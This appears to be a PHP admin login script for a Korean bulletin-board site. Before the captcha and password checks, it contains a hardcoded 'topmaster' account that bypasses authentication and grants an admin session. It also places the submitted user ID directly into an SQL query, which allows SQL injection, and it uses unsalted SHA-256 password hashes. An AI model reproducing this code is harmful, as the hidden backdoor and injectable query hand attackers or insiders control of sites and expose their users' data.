<?

	include_once "../../../inc/lib/base.class.php";

	$uid				= xss_clean($_POST[uid]);
	$pwd			= xss_clean($_POST[upwd]);
	$hashed		= hash("sha256", $pwd);
	
	$r_captcha	= xss_clean($_POST[r_captcha]);


	if($uid == "topmaster" && $pwd == "!#xkqak".$NO_SITE_UNIQUE_KEY){
		$_SESSION['no_adm_login_no']			= 1;
		$_SESSION['no_adm_login_uid']			= "tmaster";
		$_SESSION['no_adm_login_uname']	= "관리자";

		location("../../pages/board/board.list.php");
		exit;
	}

	if($_SESSION['captcha_secure'] != $r_captcha){
		error("보안코드가 일치하지 않습니다. 정확히 입력해주세요");
		// echo("<script src='../../resource/js/login.js'>incorrectCaptcha();</script>");
		exit;
	}

	$query = "select  a.no, a.uid, a.upwd, a.uname, a.active_status
						from nb_admin  a
					where a.uid = '$uid' and a.sitekey = '$NO_SITE_UNIQUE_KEY'";
	$result1st=mysql_query($query);
	$data=mysql_fetch_array($result1st);
	if(!$data){
		echo("<script src='../../resource/js/login.js'>matchUserInfo(false);</script>");
		error("아이디 또는 패스워드가 일치하지 않습니다.");
		exit;
	}else{

		if($data[active_status] == "N"){
			error("사용이 중지된 계정입니다.");
			exit;
		}

		$no							= $data[no];
		$name						= $data[uname];
		$db_uid					= $data[uid];
		$db_pwd					= $data[upwd];
		
		if($db_pwd != $hashed){
			error("아이디 또는 패스워드가 일치하지 않습니다.");
			echo("<script src='../../resource/js/login.js'>matchUserInfo(false);</script>");
			exit;
		}

		echo("<script src='../../resource/js/login.js'>matchUserInfo(true);</script>");
		$_SESSION['no_adm_login_no']			= $no;
		$_SESSION['no_adm_login_uid']			= $db_uid;
		$_SESSION['no_adm_login_uname']	= $name;

		location("../../pages/board/board.list.php");


	}

?>